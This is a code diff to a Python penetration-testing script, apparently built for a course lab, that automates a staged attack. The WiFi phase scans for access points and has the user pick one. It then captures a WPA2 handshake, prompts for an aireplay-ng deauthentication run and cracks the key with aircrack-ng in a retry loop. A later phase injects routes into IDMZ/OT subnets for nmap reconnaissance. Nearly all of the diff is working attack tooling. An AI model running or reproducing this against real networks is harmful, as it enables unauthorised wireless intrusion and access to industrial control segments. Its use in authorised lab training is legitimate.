@@ -469,58 +469,160 @@ def preflight_check():
         err("Install with: sudo apt-get install -y nmap aircrack-ng")
         sys.exit(1)
     ok(f"Preflight OK — all tools found: {', '.join(tools)}")
-
-    # Auto-inject routes to known target subnets so scans reach IDMZ/OT
-    auto_route([
-        CFG["nmap"]["idmz_subnet"],
-        "10.20.20.0/24",
-    ])
+    # Routing is deferred to Phase 2 — we may not be on the target network yet.
 
 
 # ── Phase implementations ─────────────────────────────────────────────────────
+
+def _parse_airodump_csv(csv_path: str) -> list[dict]:
+    """
+    Parse the airodump-ng *-01.csv and return a list of AP dicts:
+    {ssid, bssid, channel, power}
+    Skips the client section and blank/header rows.
+    """
+    aps: list[dict] = []
+    try:
+        with open(csv_path, errors="ignore") as f:
+            in_ap_section = True
+            for line in f:
+                line = line.strip()
+                if not line:
+                    continue
+                if line.startswith("Station MAC"):
+                    in_ap_section = False
+                    continue
+                if not in_ap_section:
+                    continue
+                # Skip header row
+                if line.startswith("BSSID"):
+                    continue
+                parts = [p.strip() for p in line.split(",")]
+                if len(parts) < 14:
+                    continue
+                bssid   = parts[0]
+                power   = parts[8]
+                channel = parts[3]
+                ssid    = parts[13]
+                # Validate BSSID looks real
+                if len(bssid) != 17 or bssid.count(":") != 5:
+                    continue
+                aps.append({
+                    "bssid":   bssid,
+                    "ssid":    ssid if ssid else "<hidden>",
+                    "channel": channel,
+                    "power":   power,
+                })
+    except FileNotFoundError:
+        pass
+    return aps
+
 
 def phase1_wifi_crack() -> PhaseResult:
     phase_header(1, "WiFi AP Crack (WPA2 Handshake)")
     r = PhaseResult("WiFi Crack")
 
-    bssid   = Prompt.ask("  Enter AP BSSID  (e.g. AA:BB:CC:DD:EE:FF)")
-    channel = Prompt.ask("  Enter AP channel (e.g. 6)")
-    cap     = CFG["wifi"]["capture_file"]
-    iface   = CFG["wifi"]["interface"]
-    mon     = CFG["wifi"]["monitor_iface"]
-    wl      = CFG["wifi"]["wordlist"]
+    cap   = CFG["wifi"]["capture_file"]
+    iface = CFG["wifi"]["interface"]
+    mon   = CFG["wifi"]["monitor_iface"]
+    wl    = _resolve_wordlist(CFG["wifi"]["wordlist"])
 
-    ok("Starting monitor mode...")
-    run_cmd("airmon-ng check kill")
-    run_cmd(f"airmon-ng start {iface}")
+    # ── Monitor mode ──────────────────────────────────────────────────────────
+    ok("Enabling monitor mode...")
+    run_cmd("sudo airmon-ng check kill", capture=False)
+    run_cmd(f"sudo airmon-ng start {iface}", capture=False)
 
-    ok(f"Capturing handshake on ch {channel} (60 s)...")
-    warn(f"Run in a second terminal: aireplay-ng --deauth 10 -a {bssid} {mon}")
+    # ── Interactive AP scan ───────────────────────────────────────────────────
+    scan_csv = "/tmp/incs4810_scan"
+    info("Scanning for APs (12 s) — please wait...")
     run_cmd(
-        f"timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon}",
-        timeout=75
+        f"sudo timeout 12 airodump-ng --output-format csv -w {scan_csv} {mon} 2>/dev/null",
+        timeout=18, capture=False,
     )
 
-    ok("Cracking handshake with aircrack-ng...")
-    rc, out = run_cmd(f"aircrack-ng {cap}-01.cap -w {wl}", timeout=300)
+    aps = _parse_airodump_csv(f"{scan_csv}-01.csv")
 
-    if "KEY FOUND" in out:
-        key_lines = [l for l in out.splitlines() if "KEY FOUND" in l]
-        r.finding = key_lines[0] if key_lines else "KEY FOUND"
-        r.status  = "success"
-        ok(r.finding)
-    else:
+    if not aps:
+        err("No APs found in scan output — check interface name in CFG and try again")
         r.status  = "failed"
-        r.finding = "Handshake not cracked (try larger wordlist)"
-        err(r.finding)
+        r.finding = "AP scan returned no results"
+        return r
 
-    r.output = out[-1000:]
+    ap_table = Table(
+        title="[bold magenta]Discovered Access Points[/bold magenta]",
+        show_header=True, header_style="bold cyan", border_style="dim",
+    )
+    ap_table.add_column("#",       style="dim",    width=4)
+    ap_table.add_column("SSID",    style="green",  width=24)
+    ap_table.add_column("BSSID",   style="yellow", width=20)
+    ap_table.add_column("Channel", style="cyan",   width=9)
+    ap_table.add_column("Power",   style="white",  width=8)
+    for i, ap in enumerate(aps, 1):
+        ap_table.add_row(str(i), ap["ssid"], ap["bssid"], ap["channel"], ap["power"])
+    console.print(ap_table)
+
+    console.print()
+    raw = Prompt.ask(f"[yellow]Select target AP (1–{len(aps)})[/yellow]").strip()
+    try:
+        chosen = aps[int(raw) - 1]
+    except (ValueError, IndexError):
+        err("Invalid selection")
+        r.status  = "failed"
+        r.finding = "No AP selected"
+        return r
+
+    bssid   = chosen["bssid"]
+    channel = chosen["channel"].strip()
+    ok(f"Target: [bold]{chosen['ssid']}[/bold]  BSSID={bssid}  CH={channel}")
+
+    # ── Handshake capture + crack loop ────────────────────────────────────────
+    while True:
+        ok(f"Capturing handshake on CH {channel} (60 s)...")
+        warn(f"Run deauth in another terminal: sudo aireplay-ng --deauth 10 -a {bssid} {mon}")
+        run_cmd(
+            f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} -w {cap} {mon} 2>/dev/null",
+            timeout=75, capture=False,
+        )
+
+        cap_file = f"{cap}-01.cap"
+        if not os.path.exists(cap_file):
+            warn("Capture file not created — interface may have dropped monitor mode")
+        else:
+            ok("Cracking handshake with aircrack-ng...")
+            wl_arg = wl if wl else "/dev/null"
+            rc, out = run_cmd(
+                f"sudo aircrack-ng {cap_file} -w {wl_arg}", timeout=300
+            )
+            if "KEY FOUND" in out:
+                key_line = next((l for l in out.splitlines() if "KEY FOUND" in l), "KEY FOUND")
+                r.status  = "success"
+                r.finding = key_line
+                r.output  = out[-1000:]
+                ok(r.finding)
+                return r
+
+        # Crack failed — offer retry
+        console.print()
+        if not Confirm.ask("[yellow]Handshake capture failed — retry on this AP?[/yellow]",
+                           default=True):
+            break
+
+    r.status  = "failed"
+    r.finding = "Handshake not cracked (try larger wordlist or longer capture window)"
+    err(r.finding)
     return r
 
 
 def phase2_idmz_recon() -> PhaseResult:
     phase_header(2, "IDMZ Recon (nmap)")
     r = PhaseResult("IDMZ Recon")
+
+    # Routing is injected here — after Phase 1 has connected us to the target
+    # WiFi network, so we are actually on the right segment.
+    info("Injecting routes to IDMZ / OT subnets (post-WiFi association)...")
+    auto_route([
+        CFG["nmap"]["idmz_subnet"],
+        "10.20.20.0/24",
+    ])
 
     subnet = CFG["nmap"]["idmz_subnet"]
     ports  = CFG["nmap"]["ports"]
